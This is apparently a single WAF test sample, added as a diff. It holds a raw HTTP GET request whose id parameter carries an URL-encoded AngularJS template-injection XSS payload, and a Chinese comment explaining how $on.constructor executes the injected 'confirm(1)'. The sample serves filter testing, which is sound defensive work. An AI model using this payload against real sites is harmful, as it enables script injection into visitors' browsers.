@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_框架_AngularJS-06506757
+# $on 是 AngularJS 的事件监听器函数，用于注册和处理事件。通过调用 $on 的 constructor 属性，并传入恶意代码 'confirm(1)'，然后通过调用构造函数的方式来执行其中的代码。
+GET /?id=%7B%7B$on.constructor%28%27confirm%281%29%27%29%28%29%7D%7D&bid=hd_tag_m8mv25dn HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv25dn
+RM-PRO-Token: 8fe6c1d4c7734d99c8d8e6eeb3940121
+RM-PRO-Time: 1742808462015
+User-Agent: curl/7.83.1
+
